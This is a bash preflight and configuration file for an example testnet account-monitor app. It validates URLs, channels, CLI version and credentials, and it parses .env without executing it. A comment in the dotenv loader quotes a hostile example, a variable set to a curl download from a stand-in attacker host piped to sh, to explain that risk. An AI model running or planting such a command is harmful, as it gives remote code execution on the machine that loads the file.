# shellcheck shell=bash
# shellcheck disable=SC2034  # this file is only ever sourced; run.sh is what reads these
#
# Everything that has to be true before this app opens a socket.
#
# All of it runs before the first attach, because a check that fires after the
# cursor has already advanced is not a check — it is a cursor pointing into a
# stream nobody should have been reading.

# The CLI release this example was written and verified against. Pinned
# exactly, per CONTRIBUTING § 3: a reader running this a year from now should
# get the behaviour the README describes.
readonly PINNED_CLI_VERSION="0.4.0"
# What that release reports as its API spec tag. Not a pin — it is printed so a
# surprising frame can be lined up against a known contract.
readonly EXPECTED_SPEC_TAG="v0.8.1"

# The durable testnet deployment, prefix included.
#
# `/indexer` is load-bearing: the bare host answers 404 on every route. The
# legacy gateway base this catalog used to ship — `exchange.nexus.xyz/api/exchange`
# — answers 500 on every route now (ENG-14039), which is why neither the CLI's
# built-in `--network testnet` nor its `NEXUS_BASE_URL` escape hatch is used
# here. See `build_cli_config` for what is used instead.
readonly DEFAULT_BASE_URL="https://api.testnet.nexus.xyz/indexer"

# `/ws`, not `/stream`. Both are live and both upgrade; they are different
# protocols and only one of them can be resumed.
#
#   GET /indexer/ws      401 {"code":"ws_token_missing"} + a valid
#                        sec-websocket-accept — token-gated, and the only
#                        endpoint carrying per-account channels. Its envelope
#                        is `op`-tagged and carries `seq`, `seq_at_join`,
#                        `since` and `out_of_sync`.
#   GET /indexer/stream  101 Switching Protocols with no token at all. That is
#                        not a convenience — it is the tell. Token auth was
#                        removed there (ENG-3128) *because* the channel carries
#                        only public market data and never per-account data.
#                        Its protocol is a single untagged
#                        `{"subscribe":["trades:*"]}` message with no sequence
#                        numbers, no `since`, and no `out_of_sync`.
#
# So `/stream` is not a lighter-weight option for this app. An account monitor
# cannot subscribe to an account channel there, and a resumable monitor has
# nothing on it to resume from.
readonly DEFAULT_WS_URL="wss://api.testnet.nexus.xyz/indexer/ws"

# Real funds, refused by hostname before any request is composed. `api.nexus.xyz`
# has no DNS record today, so there is nothing to connect to and no way to
# verify a guess — but the refusal is by name rather than by resolution
# failure, so it keeps working the day the record appears.
readonly MAINNET_HOSTS="api.nexus.xyz nexus.xyz"

# Load `.env` into the environment **without executing it**.
#
# `source .env` is the usual one-liner and it is a code-execution primitive: a
# line like `NEXUS_API_KEY=$(curl evil.example/x | sh)` runs on load. Since the
# whole purpose of the file is to hold a credential, it is exactly the file
# least worth trusting with a shell. So it is parsed: `KEY=VALUE`, one optional
# layer of quotes stripped, no expansion, no substitution, nothing else
# honoured.
#
# The real environment wins over the file, so `MONITOR_CHANNELS=fills ./run.sh`
# does what it looks like.
load_dotenv() {
  local file=$1 line key value lineno=0
  [[ -f $file ]] || return 0

  while IFS= read -r line || [[ -n $line ]]; do
    lineno=$(( lineno + 1 ))
    line=${line%$'\r'}                                   # tolerate CRLF files
    [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
    line=${line#"${line%%[![:space:]]*}"}                # trim leading blanks
    [[ $line == export[[:space:]]* ]] && line=${line#export }

    if [[ ! $line =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
      # The line number, never the line: an unparsable line in this file is as
      # likely as not to be a mangled secret, and a warning that echoed it
      # would put it in the log this script is designed to be read out of.
      warn "$file line $lineno is not KEY=VALUE; ignoring it"
      continue
    fi
    key=${BASH_REMATCH[1]}
    value=${BASH_REMATCH[2]}

    if (( ${#value} >= 2 )) && [[ ( $value == \"*\" ) || ( $value == \'*\' ) ]]; then
      value=${value:1:${#value}-2}
    fi

    [[ -n ${!key+set} ]] && continue                     # already in the environment
    export "$key=$value"
  done <"$file"
}

# Resolve and validate every knob.
resolve_config() {
  # `NEXUS_EXCHANGE_API_URL` is the catalog-wide override every other example
  # here reads, so it is honoured — but only as a fallback, and the app's own
  # `MONITOR_BASE_URL` wins. The names are not interchangeable: `NEXUS_*` is
  # the *CLI's* namespace, and a variable that looks like one the CLI reads but
  # is actually consumed by a script sitting on top of it is a good way to
  # spend an afternoon. Everything this app owns is `MONITOR_*` for that reason.
  MONITOR_BASE_URL=${MONITOR_BASE_URL:-${NEXUS_EXCHANGE_API_URL:-$DEFAULT_BASE_URL}}
  MONITOR_WS_URL=${MONITOR_WS_URL:-$DEFAULT_WS_URL}
  MONITOR_NETWORK_LABEL=${MONITOR_NETWORK_LABEL:-nexus-testnet-indexer}
  MONITOR_CHANNELS=${MONITOR_CHANNELS:-orders fills positions balances}
  MONITOR_STATE_DIR=${MONITOR_STATE_DIR:-$SCRIPT_DIR/.state}
  MONITOR_MAX_EVENTS=${MONITOR_MAX_EVENTS:-0}
  MONITOR_MAX_ATTEMPTS=${MONITOR_MAX_ATTEMPTS:-0}
  MONITOR_RUN_SECONDS=${MONITOR_RUN_SECONDS:-0}
  MONITOR_HANDSHAKE_SECONDS=${MONITOR_HANDSHAKE_SECONDS:-30}
  MONITOR_IDLE_SECONDS=${MONITOR_IDLE_SECONDS:-300}
  MONITOR_BACKOFF_SECONDS=${MONITOR_BACKOFF_SECONDS:-1}
  MONITOR_BACKOFF_MAX_SECONDS=${MONITOR_BACKOFF_MAX_SECONDS:-30}
  MONITOR_PROVE_AFTER=${MONITOR_PROVE_AFTER:-3}
  MONITOR_ALLOW_CLI_VERSION=${MONITOR_ALLOW_CLI_VERSION:-0}

  require_int_range MONITOR_MAX_EVENTS "$MONITOR_MAX_EVENTS" 0 1000000
  require_int_range MONITOR_MAX_ATTEMPTS "$MONITOR_MAX_ATTEMPTS" 0 1000
  require_int_range MONITOR_RUN_SECONDS "$MONITOR_RUN_SECONDS" 0 86400
  require_int_range MONITOR_HANDSHAKE_SECONDS "$MONITOR_HANDSHAKE_SECONDS" 1 600
  require_int_range MONITOR_IDLE_SECONDS "$MONITOR_IDLE_SECONDS" 0 86400
  require_int_range MONITOR_BACKOFF_SECONDS "$MONITOR_BACKOFF_SECONDS" 0 60
  require_int_range MONITOR_BACKOFF_MAX_SECONDS "$MONITOR_BACKOFF_MAX_SECONDS" 1 3600
  require_int_range MONITOR_PROVE_AFTER "$MONITOR_PROVE_AFTER" 1 10000

  [[ $MONITOR_NETWORK_LABEL =~ ^[a-z0-9]([a-z0-9_.-]{0,30}[a-z0-9])?$ ]] ||
    die "$EX_USAGE" "MONITOR_NETWORK_LABEL must be a short lowercase label, got $(quoted "$MONITOR_NETWORK_LABEL")"

  resolve_channels
  check_urls
}

# The channel list, split and checked against what the endpoint actually
# publishes.
#
# Channels divide two ways and the division is not cosmetic:
#
#  · **Per-account** — `orders`, `fills`, `positions`, `balances`,
#    `liquidations`. Scoped to the wallet that minted the token, and they take
#    no `market` field.
#  · **Public** — `trades`, `book`, `candles`, `ticker`. Each *requires* a
#    `market`, and a monitor that subscribes to one without it gets an `error`
#    frame rather than data.
#
# This app follows per-account channels only. Adding a public one would mean
# threading a market through the whole cursor store for no gain: the public
# channels are what `trading-terminal` already shows, and their sequences are
# venue-wide rather than yours.
#
# `engine` is refused with its own message. It is public and venue-wide, it
# takes no `market`, and subscribe/unsubscribe on it are accepted and acked —
# so it looks exactly like a working per-account channel right up until you
# notice it never publishes a frame. It is reserved; there is no payload shape
# to build against yet.
resolve_channels() {
  local channel
  CHANNELS=()
  for channel in $MONITOR_CHANNELS; do
    case $channel in
      orders|fills|positions|balances|liquidations)
        CHANNELS[${#CHANNELS[@]}]=$channel
        ;;
      engine)
        die "$EX_USAGE" "the \`engine\` channel is accepted and acked by the venue but publishes no frames yet — it is reserved. A monitor on it would attach cleanly and report nothing forever, which is the one failure this app is written to make impossible."
        ;;
      trades|book|candles|ticker)
        die "$EX_USAGE" "$(quoted "$channel") is a public channel and requires a market. This app follows per-account channels only: orders, fills, positions, balances, liquidations."
        ;;
      *)
        die "$EX_USAGE" "unknown channel $(quoted "$channel"). Per-account channels are: orders, fills, positions, balances, liquidations."
        ;;
    esac
  done
  (( ${#CHANNELS[@]} )) || die "$EX_USAGE" "MONITOR_CHANNELS is empty; there is nothing to monitor."
}

# host_of <url> — the hostname, with no scheme, port, path or userinfo.
host_of() {
  local url=$1 rest
  rest=${url#*://}
  rest=${rest%%/*}
  rest=${rest##*@}
  rest=${rest%%\?*}
  rest=${rest%:*}
  printf '%s' "$(lower "$rest")"
}

# Refuse anything that could move money that matters, and refuse a URL shaped
# so that the refusal could be bypassed.
#
# The CLI has its own real-funds guardrails and they are good. This is a
# second, blunter one at the layer that decides *what to connect to*: a
# long-lived monitor is not something to point at a real book by editing one
# environment variable.
check_urls() {
  local base_host ws_host host

  [[ $MONITOR_BASE_URL == https://* || $MONITOR_BASE_URL == http://* ]] ||
    die "$EX_USAGE" "MONITOR_BASE_URL must be an http(s) URL, got $(quoted "$MONITOR_BASE_URL")"
  [[ $MONITOR_WS_URL == wss://* || $MONITOR_WS_URL == ws://* ]] ||
    die "$EX_USAGE" "MONITOR_WS_URL must be a ws(s) URL, got $(quoted "$MONITOR_WS_URL")"

  # No query and no fragment on either. The CLI appends `?token=…` to the WS
  # origin, so an origin that already carries a query would produce a URL with
  # two of them and a token the server never reads — and a base URL with a
  # query is a redirect waiting to happen.
  case $MONITOR_BASE_URL in *\?*|*\#*) die "$EX_USAGE" "MONITOR_BASE_URL must carry no query or fragment" ;; esac
  case $MONITOR_WS_URL in
    *\?*|*\#*)
      die "$EX_USAGE" "MONITOR_WS_URL must carry no query string. The single-use token is appended as \`?token=…\` at connect time, and a second query would be silently dropped."
      ;;
  esac
  # Userinfo in either is refused rather than stripped: a credential in a URL
  # ends up in the process list, and quietly removing it would hide that the
  # reader put one there.
  case ${MONITOR_BASE_URL#*://} in *@*) die "$EX_USAGE" "MONITOR_BASE_URL must not carry userinfo" ;; esac
  case ${MONITOR_WS_URL#*://} in *@*) die "$EX_USAGE" "MONITOR_WS_URL must not carry userinfo" ;; esac

  base_host=$(host_of "$MONITOR_BASE_URL")
  ws_host=$(host_of "$MONITOR_WS_URL")

  for host in $MAINNET_HOSTS; do
    if [[ $base_host == "$host" || $ws_host == "$host" ]]; then
      die "$EX_CONFIG" "refusing to run against $(quoted "$host") — that is the real-funds deployment. This example monitors play funds only, and there is deliberately no override for this."
    fi
  done

  # **The token is scoped to the host that minted it.** `POST /ws/token`
  # returns a single-use token bound to the account *and to the network that
  # issued it*; presenting it to a different origin is a 401 with no useful
  # diagnosis. So a split base/WS pair is refused rather than attempted — this
  # is the same reasoning the Rust SDK gives for reporting no WS origin for
  # `testnet` at all rather than pairing the legacy REST host with the new
  # socket host (ENG-3398).
  if [[ $base_host != "$ws_host" ]]; then
    die "$EX_CONFIG" "MONITOR_BASE_URL is on $(quoted "$base_host") and MONITOR_WS_URL is on $(quoted "$ws_host"). The upgrade token is minted over REST and is scoped to the host that issued it, so a token from one would be rejected by the other. Point both at the same deployment."
  fi

  MONITOR_HOST=$base_host
}

# Build a CLI config declaring this deployment as a custom network.
#
# ── Why this exists at all ──────────────────────────────────────────────────
#
# `nexus --network testnet` cannot reach this venue at CLI 0.4.0, for two
# independent reasons:
#
#  1. Its REST base is the legacy gateway `https://exchange.nexus.xyz/api/exchange`,
#     which answers 500 on every route today (ENG-14039).
#  2. Its WebSocket origin is **unset**. The SDK reports `None` for testnet on
#     purpose — the spec's published origin is a different host from the legacy
#     REST base, and pairing them would send a token to a server that never
#     issued it — so `nexus ws --network testnet` refuses with "the selected
#     network has no WebSocket endpoint" rather than guessing one.
#
# The CLI's own answer to both is a **custom network**: a labelled entry
# carrying `base_url`, `ws_url` and a declared `funds`, selected with
# `--network <label>`. The deprecated `NEXUS_BASE_URL` / `--base-url` override
# cannot be used instead, because it redirects REST only — it does not declare
# a WS origin, so `nexus ws` would still refuse — and it leaves `funds`
# undeclared, which the CLI fails closed on.
#
# ── Why the app writes the file rather than asking you to ───────────────────
#
# The config is written into the app's own state directory and the CLI is
# pointed at it with `XDG_CONFIG_HOME`, which `nexus` honours on every platform
# (it reads the variable directly rather than going through a per-OS config
# path). Three consequences, all of them the point:
#
#  · **Your own `~/.config/nexus/config.json` is never read or written.** The
#    example cannot break your CLI setup, and uninstalling it is `rm -rf .state`.
#  · **No credential is ever written to disk.** The generated file declares the
#    network and nothing else. `NEXUS_API_KEY` / `NEXUS_API_SECRET` come from
#    the environment, which outranks the file and is not namespaced per network
#    — so the key you already have works against a label this app invented.
#  · **`funds` is declared `play`, and only after the hostname check above.**
#    The CLI treats an absent or unrecognised `funds` as `unknown` and refuses
#    the money-moving commands; declaring `play` is a claim, so it is made
#    downstream of the check that earns it rather than as a constant.
#
# Built with `jq`, never by string concatenation: every value in it comes from
# the environment and is escaped by a JSON encoder rather than by hoping it
# contains no quotes.
build_cli_config() {
  MONITOR_CLI_HOME="$MONITOR_STATE_DIR/cli-home"
  mkdir -p -- "$MONITOR_CLI_HOME/nexus" ||
    die "$EX_CONFIG" "cannot create $MONITOR_CLI_HOME/nexus"

  jq -n \
    --arg label "$MONITOR_NETWORK_LABEL" \
    --arg base "$MONITOR_BASE_URL" \
    --arg ws "$MONITOR_WS_URL" \
    '{ network: $label,
       custom_networks: { ($label): { base_url: $base, ws_url: $ws, funds: "play" } } }' \
    >"$MONITOR_CLI_HOME/nexus/config.json" ||
    die "$EX_CONFIG" "could not write the generated CLI config"

  # It holds no secret, but it declares where this app connects, so it is not
  # world-readable either.
  chmod 0600 "$MONITOR_CLI_HOME/nexus/config.json" 2>/dev/null || true
}

# Check the CLI is the pinned release.
#
# `nexus --version` prints, e.g.:
#   nexus 0.4.0 (spec v0.8.1, nexus-exchange 0.9.1)
check_cli_version() {
  local line name found
  line=$(nexus --version 2>/dev/null) ||
    die "$EX_CONFIG" "\`nexus --version\` failed. Is the CLI installed? See the README's Prerequisites."
  read -r name found _ <<<"$line"
  : "$name"

  CLI_VERSION_LINE=$line
  if [[ $found != "$PINNED_CLI_VERSION" ]]; then
    if [[ $MONITOR_ALLOW_CLI_VERSION == 1 ]]; then
      warn "CLI is $(quoted "$found"), not the pinned $PINNED_CLI_VERSION; continuing because MONITOR_ALLOW_CLI_VERSION=1"
    else
      die "$EX_CONFIG" "this example is pinned to nexus $PINNED_CLI_VERSION and found $(quoted "$found"). Install the pinned release, or set MONITOR_ALLOW_CLI_VERSION=1 to try anyway — the reconnect behaviour this app is built around is version-specific (see the README's \"One process per attempt\")."
    fi
  fi
  [[ $line == *"$EXPECTED_SPEC_TAG"* ]] ||
    warn "the CLI reports a different API spec tag than the $EXPECTED_SPEC_TAG this example was written against: $line"
}

# Can this run authenticate?
#
# Answered by asking the venue, not by inspecting the environment. Per-account
# channels are scoped to the wallet that minted the token, so an unauthenticated
# monitor does not degrade to "public data" — it degrades to nothing at all,
# and would sit there acking subscriptions and reporting no events. That is
# indistinguishable from a quiet account, so it is a refusal rather than a
# warning.
check_auth() {
  if nx orders --limit 1; then
    return 0
  fi
  error "the authenticated read \`nexus orders\` failed:"
  printf '%s\n' "$NX_ERR" >&2
  die "$EX_CONFIG" "per-account channels need credentials, and this run has none that work. Copy .env.example to .env and add a testnet key pair. Without them the monitor would attach, ack every subscription, and report nothing — which looks exactly like a quiet account."
}
